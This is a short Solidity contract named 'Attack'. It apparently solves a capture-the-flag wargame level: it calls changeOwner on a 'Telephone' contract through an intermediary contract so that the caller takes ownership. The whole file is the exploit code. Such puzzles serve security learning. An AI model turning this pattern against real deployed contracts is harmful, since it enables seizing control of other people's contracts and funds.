// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract Attack {
    Telephone telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
